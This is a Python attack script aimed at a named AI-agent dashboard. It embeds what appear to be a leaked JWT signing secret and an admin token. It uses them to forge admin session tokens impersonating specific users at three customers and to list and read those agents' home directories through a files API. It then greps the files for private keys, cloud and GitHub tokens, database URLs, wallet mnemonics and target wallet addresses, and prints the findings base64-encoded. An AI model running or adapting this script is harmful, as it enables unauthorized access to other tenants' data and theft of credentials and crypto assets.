#!/usr/bin/env python3
# i29158: targeted deep-read of 3 high-value agent home dirs via dashboard files-RPC.
# (a) tianyue3 user3 agent-0cf829f4: attachments herald/rpc-port design docs
# (b) agent-768c13da Plexus Codex Ben: crust-smanager / .codex-sessions / .docker
# (c) agent-8c6ac8b3 GoldenYears: lumii-work-ops / lumii-assistant / docs
# Read-only; grep for secrets; emit R:<key>:<b64> lines.
import os, sys, json, time, base64, hmac, hashlib, subprocess, re
import urllib.parse as up

HOST = "dashboard.lumiiai.cn"
UA = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36"
JWT_SECRET = "w2I+OOqT9vkI12T3bNGwNp/2EA/L2H1ecwnWwA7UZ6A="
ADMIN_TOKEN = "6c73b13da5b9d09c642a3daa85be7d62d8025acfaebfdbe6"
T0 = time.time()
def el(): return int(time.time() - T0)
def _b64(s): return base64.b64encode(s.encode("utf-8", "replace")).decode()
OUTBUDGET = [1500000]  # chars of decoded JSON we are willing to emit
def R(k, v):
    s = v if isinstance(v, str) else json.dumps(v, ensure_ascii=False, default=str)
    OUTBUDGET[0] -= len(s)
    print("R:%s:%s" % (k, _b64(s)), flush=True)

def curl(args, timeout=30):
    try:
        r = subprocess.run(["curl", "-s", "-k", "-m", str(timeout)] + args, capture_output=True, timeout=timeout + 15)
        return r.returncode, r.stdout, r.stderr
    except Exception as e:
        return -1, b"", repr(e).encode()

def call(path, token=None, bearer=None, timeout=25, maxlen=250000):
    url = "https://%s%s" % (HOST, path)
    args = ["--http2", "-A", UA, "-H", "Accept: application/json, text/plain, */*", "-w", "\n__CODE__%{http_code}"]
    if token: args += ["-H", "Cookie: session=" + token]
    if bearer: args += ["-H", "Authorization: Bearer " + bearer]
    args += [url]
    rc, out, err = curl(args, timeout=timeout)
    txt = out.decode("utf-8", "replace"); code = ""; i = txt.rfind("__CODE__")
    if i >= 0:
        code = txt[i+8:].strip()[:3]; txt = txt[:i]
    return {"code": code, "body": txt[:maxlen], "len": len(txt), "rc": rc}

def b64u(b):
    if isinstance(b, str): b = b.encode()
    return base64.urlsafe_b64encode(b).rstrip(b'=').decode()

def forge(payload):
    h = b64u(json.dumps({"alg": "HS256", "typ": "JWT"}, separators=(",", ":")))
    p = b64u(json.dumps(payload, separators=(",", ":")))
    sig = b64u(hmac.new(JWT_SECRET.encode(), (h + "." + p).encode(), hashlib.sha256).digest())
    return h + "." + p + "." + sig

def tok_for(uid, customer="aro"):
    return forge({"userId": uid, "email": "probe@x", "customer": customer, "role": "admin"})

def jload(s):
    try: return json.loads(s)
    except Exception: return None

def qp(p): return up.quote(p, safe="/")

def lst(aid, path, tok):
    r = call("/api/agents/%s/files?action=list&path=%s" % (aid, qp(path)), token=tok)
    j = jload(r["body"])
    ents = j.get("entries") if isinstance(j, dict) and isinstance(j.get("entries"), list) else []
    return r["code"], ents, r["len"], r["body"][:300]

def rd(aid, path, tok, maxlen=250000):
    r = call("/api/agents/%s/files?action=read&path=%s" % (aid, qp(path)), token=tok, maxlen=maxlen)
    return r["code"], r["body"], r["len"]

def content_of(body):
    j = jload(body)
    if isinstance(j, dict):
        for k in ("content", "text", "data", "body"):
            if isinstance(j.get(k), str):
                return j[k]
        return json.dumps(j, ensure_ascii=False)[:0] if False else None
    return body

SKIP_DIR = re.compile(r'(^|/)(node_modules|\.git|\.next|dist|build|vendor|__pycache__|\.cache|_cacache|\.venv|venv|site-packages|\.gradle|target|\.turbo)(/|$)')
BIN_EXT = re.compile(r'\.(png|jpg|jpeg|gif|webp|ico|pdf|docx|xlsx|zip|gz|tar|tgz|woff2?|ttf|mp4|mov|so|bin|pyc|class|jar|wasm|sqlite|db)$', re.I)

SENS_NAME = re.compile(r'(?i)(secret|token|cred|passw|deploy|webhook|herald|rpc-port|docker-compose|config|\.ya?ml|\.json|\.md|\.sh|\.env|\.pem|\.key|id_rsa|id_ed25519|dsn|wallet|keystore|mnemonic|\.sql|\.txt|\.conf|\.ini|\.toml|\.ts|\.js|\.py|\.go)')

PATTERNS = [
 ("0x64", re.compile(r'\b0x[0-9a-fA-F]{64}\b')),
 ("JWT", re.compile(r'(?i)jwt[_\-]?secret\s*[:=]\s*\S{6,}|JWT_SECRET\s*[:=]\s*\S{6,}')),
 ("DSN", re.compile(r'(?i)(postgres(?:ql)?://[^\s"\'<>]+|mysql://[^\s"\'<>]+|redis://[^\s"\'<>]+|mongodb(?:\+srv)?://[^\s"\'<>]+)')),
 ("CLOUD", re.compile(r'(AKID[A-Za-z0-9]{26,}|LTAI[A-Za-z0-9]{12,}|AKIA[0-9A-Z]{16}|dckr_pat_[A-Za-z0-9_\-]{20,}|ASIA[0-9A-Z]{16})')),
 ("PEM", re.compile(r'-----BEGIN [A-Z ]*PRIVATE KEY-----')),
 ("GHTOK", re.compile(r'(gh[pousr]_[A-Za-z0-9]{30,}|github_pat_[A-Za-z0-9_]{40,}|glpat-[A-Za-z0-9_\-]{16,})')),
 ("ZOO", re.compile(r'(?i)(zoofi[\-_]?index|wand-index|api\.zoofi\.io|trycloudflare\.com|cloudflared|cf[\-_]tunnel|argotunnel\.com|tunnel\.[a-z0-9\-\.]+)')),
 ("HMAC", re.compile(r'(?i)(x-hub-signature(-256)?|hmac[\w\-]*\s*[:=]\s*\S{8,}|webhook[\w\-]*\s*[:=]\s*\S{8,}|WH_SECRET|signature[\w\-]*\s*[:=]\s*\S{12,})')),
 ("CRYPT", re.compile(r'(?i)(mnemonic|cipherparams|"crypto"\s*:\s*\{|"scrypt"|kdfparams)')),
 ("SECRETKV", re.compile(r'(?i)([A-Za-z0-9_\-]*(secret|passw|passwd|token|apikey|api[_-]?key|access[_-]?key|private[_-]?key)[A-Za-z0-9_\-]*\s*[:=]\s*["\']?[A-Za-z0-9_\-\/+=\.!@#$%^&*]{12,})')),
 ("URLPORT", re.compile(r'https?://[A-Za-z0-9\.\-_]+(?::\d{2,5})?[^\s"\'<>\)]*')),
]
TARGET_EOA = ["c56f7063fd6d199ccc443dbbf4283be602d46343", "fe18aa1efa652660f36ab84f122cd36108f903b6"]

def scan_text(txt):
    """return dict tag -> [matched one-line excerpts]"""
    res = {}
    lines = txt.splitlines() if len(txt) < 400000 else txt.splitlines()[:20000]
    for tag, rx in PATTERNS:
        hits = []
        seen = set()
        for ln in lines:
            if len(ln) > 2000:
                ln = ln[:2000]
            for m in rx.finditer(ln):
                s = m.group(0)[:300]
                if s in seen: continue
                seen.add(s)
                hits.append(s)
                if len(hits) >= 20: break
            if len(hits) >= 20: break
        if hits:
            res[tag] = hits
    # 0x64 comparison
    for tag in list(res.keys()):
        if tag == "0x64":
            for h in res[tag]:
                low = h.lower()[2:]
                if low in TARGET_EOA:
                    res.setdefault("TARGET_EOA_HIT", []).append(h)
    return res

def walk(aid, root, tok, depth, max_entries=600):
    """BFS list; return (files[list of (path,size)], dirs_count, errors, truncated)"""
    files = []
    errs = []
    queue = [(root, 0)]
    seen = set()
    truncated = False
    while queue:
        cur, d = queue.pop(0)
        if cur in seen: continue
        seen.add(cur)
        code, ents, ln, snip = lst(aid, cur, tok)
        if code != "200":
            errs.append({"path": cur, "code": code, "snip": snip[:160]})
            continue
        for e in ents:
            if len(files) >= max_entries:
                truncated = True; break
            name = str(e.get("name") or "")
            typ = str(e.get("type") or "")
            size = e.get("size")
            p = cur.rstrip("/") + "/" + name
            if typ == "directory" or typ == "dir":
                if SKIP_DIR.search(p): continue
                if d + 1 <= depth:
                    queue.append((p, d + 1))
            else:
                if BIN_EXT.search(name): continue
                files.append({"p": p, "size": size if isinstance(size, int) else None})
        if truncated: break
    return files, errs, truncated

def readfile(aid, p, tok):
    code, body, ln = rd(aid, p, tok)
    if code != "200":
        return {"p": p, "code": code}
    c = content_of(body)
    if c is None:
        # maybe raw
        return {"p": p, "code": code, "len": ln, "raw": body[:800]}
    return {"p": p, "code": code, "len": len(c), "text": c}

def do_root(aid, root, depth, maxfiles, tok, full_cap, name_allow=None, tag="ROOT"):
    files, errs, trunc = walk(aid, root, tok, depth)
    if name_allow:
        files = [f for f in files if name_allow.search(os.path.basename(f["p"]))]
    files.sort(key=lambda f: (-(bool(SENS_NAME.search(os.path.basename(f["p"])))), f["size"] or 10**9))
    manifest = [{"p": f["p"].replace(root.rstrip("/")+"/", ""), "size": f["size"]} for f in files[:800]]
    R(tag + "_MANIFEST", {"root": root, "n": len(files), "truncated": trunc,
                          "errors": errs[:12], "files": manifest})
    out = []
    nread = 0
    for f in files[:maxfiles]:
        r = readfile(aid, f["p"], tok)
        nread += 1
        if r.get("code") != "200":
            out.append({"p": f["p"].replace(root.rstrip("/")+"/", ""), "code": r.get("code")})
            continue
        txt = r.get("text")
        if txt is None:
            out.append({"p": f["p"].replace(root.rstrip("/")+"/", ""), "code": "200-nocontent", "raw": r.get("raw")})
            continue
        m = scan_text(txt)
        rec = {"p": f["p"].replace(root.rstrip("/")+"/", ""), "len": len(txt)}
        if m:
            rec["matches"] = m
        # include full content for high-value small files (bounded)
        hp = re.search(r'(?i)(herald|rpc-port|webhook|\.env|crust|codex|session|deploy|docker|secret|token|cred|dsn|\.ya?ml$|\.md$|\.conf$|\.toml$)', os.path.basename(f["p"]))
        need = bool(m) or bool(hp)
        if need and len(txt) <= full_cap:
            rec["text"] = txt
        elif need:
            rec["head"] = txt[:2500]
        out.append(rec)
        if OUTBUDGET[0] < 300000:
            out.append({"NOTE": "output budget near limit, stopped at %s" % f["p"]})
            break
    R(tag + "_READ", {"root": root, "read": nread, "items": out})

def main():
    h = call("/api/health", maxlen=2000)
    R("health", h)
    tok0 = tok_for("usr_ZxLewKrgbRYSm7rWDtQX8")
    R("forge_me", call("/api/auth/me", token=tok0, maxlen=1500))
    # confirm admin agents (fresh)
    aa = call("/api/admin/agents", bearer=ADMIN_TOKEN, maxlen=400000)
    j = jload(aa["body"])
    ags = []
    if isinstance(j, dict) and isinstance(j.get("agents"), list):
        for a in j["agents"]:
            if a.get("id") in ("agent-0cf829f4", "agent-768c13da", "agent-8c6ac8b3"):
                ags.append({"id": a.get("id"), "name": a.get("name"), "status": a.get("status"),
                            "own": a.get("imOwnerUserId"), "ip": a.get("ip"), "cust": a.get("customer")})
    R("targets", {"code": aa["code"], "agents": ags})

    # --- (a) tianyue user3 herald docs
    A = {"aid": "agent-0cf829f4", "uid": "4b4f439e-74f7-11f1-ac43-525400595be1", "cust": "tianyue"}
    tokA = tok_for(A["uid"], A["cust"])
    # raw listing of attachments dir to learn entry schema
    code, ents, ln, snip = lst(A["aid"], "/home/lumii/attachments", tokA)
    R("A_ATTLIST", {"code": code, "n": len(ents), "keys": sorted(list(ents[0].keys())) if ents else [], "first": ents[:2]})
    do_root(A["aid"], "/home/lumii/attachments", 0, 12, tokA, full_cap=60000,
            name_allow=re.compile(r'(?i)(herald|rpc-port|webhook)'), tag="A")

    # --- (b) 768c13da
    B = {"aid": "agent-768c13da", "uid": "cef8ec22-4906-11f1-ac43-525400595be1", "cust": "plexus"}
    tokB = tok_for(B["uid"], B["cust"])
    for root, depth, mx, tp in [("/home/lumii/crust-smanager", 4, 55, "B_CRUST"),
                                ("/home/lumii/.codex-sessions", 3, 30, "B_CODEX"),
                                ("/home/lumii/.docker", 5, 20, "B_DOCKER"),
                                ("/home/lumii/.agents", 3, 12, "B_AGENTS"),
                                ("/home/lumii/cc-connect", 3, 12, "B_CC")]:
        do_root(B["aid"], root, depth, mx, tokB, full_cap=25000, tag=tp)
        if OUTBUDGET[0] < 500000:
            R("B_BUDGET_STOP", {"elapsed": el()}); break

    # --- (c) 8c6ac8b3
    C = {"aid": "agent-8c6ac8b3", "uid": "bc09d9cc-63b0-11f1-ac43-525400595be1", "cust": "goldenyears"}
    tokC = tok_for(C["uid"], C["cust"])
    for root, depth, mx, tp in [("/home/lumii/lumii-work-ops", 3, 45, "C_WORKOPS"),
                                ("/home/lumii/lumii-assistant", 3, 40, "C_ASSIST"),
                                ("/home/lumii/docs", 3, 30, "C_DOCS")]:
        do_root(C["aid"], root, depth, mx, tokC, full_cap=20000, tag=tp)
        if OUTBUDGET[0] < 400000:
            R("C_BUDGET_STOP", {"elapsed": el()}); break

    # --- also read the remaining goldenyears top-level docs of interest lightly
    R("DONE", {"elapsed": el(), "outbudget_left": OUTBUDGET[0]})

try:
    main()
except Exception:
    import traceback
    R("FATAL", traceback.format_exc()[-3000:])
finally:
    R("END", {"elapsed": el()})
    sys.exit(1)
